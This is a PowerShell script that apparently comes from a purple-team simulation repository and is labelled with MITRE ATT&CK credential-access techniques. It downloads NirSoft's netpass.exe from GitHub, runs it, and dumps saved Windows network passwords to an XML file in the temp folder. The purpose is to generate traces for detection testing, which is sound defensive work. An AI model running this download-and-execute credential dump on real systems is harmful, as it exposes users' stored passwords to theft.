<#
    T1588.002 - Obtain Capabilities: Tool
    T1555 - Credentials from Password Stores
    T1555.003 - Credentials from Password Stores: Credentials from Web Browsers
    T1555.004 - Credentials from Password Stores: Windows Credential Manager
    Extract passwords from Windows saved network passwords with Nirsoft tool netpass.exe
    Download  netpass.exe from project https://raw.githubusercontent.com/mthcht/Purpleteam/main/Simulation/Windows/_bin/netpass.exe and execute it 
#>

Start-Transcript -Path "$env:tmp\simulation_traces.log" -Append
# Download and execute netpass.exe (the binary on my repo is accepting commandline, the default available on Nirsoft site does not)
if([System.IntPtr]::Size -eq 4){
    $url = "https://raw.githubusercontent.com/mthcht/Purpleteam/main/Simulation/Windows/_bin/netpass.exe"
}
elseif([System.IntPtr]::Size -eq 8){
    $url = "https://raw.githubusercontent.com/mthcht/Purpleteam/main/Simulation/Windows/_bin/netpass_x64.exe"
}
else{
    Write-Host -ForegroundColor Yellow "Warning: OS architecture could not be detected, downloading x32 version of PasswordFox.exe..."
    $url = "https://raw.githubusercontent.com/mthcht/Purpleteam/main/Simulation/Windows/_bin/netpass.exe"
}

$dumpfile = "$env:tmp\netpasswords.xml"
$outfile = "$env:tmp\netpassw.exe"

try {
    Invoke-WebRequest $url -OutFile $outfile 
    if (Test-Path $outfile){
        Write-Host -ForegroundColor Green "Success: netpass.exe downloaded to $outfile"
        & $outfile /sxml $dumpfile
        sleep 1
    }
    else{
        Write-Host -ForegroundColor Red "Error: Failed to download netpass.exe, $dumpfile not found."
    }
    if(test-path $dumpfile){
        Write-Host -ForegroundColor Green "Success: Network passwords extracted to $dumpfile"
    }
    else{
        Write-Host -ForegroundColor Red "Error: Failed to extract Network passwords to $dumpfile"
    }
}
catch {
    Write-Host -ForegroundColor Red "Erorr: $_"
}

Stop-Transcript
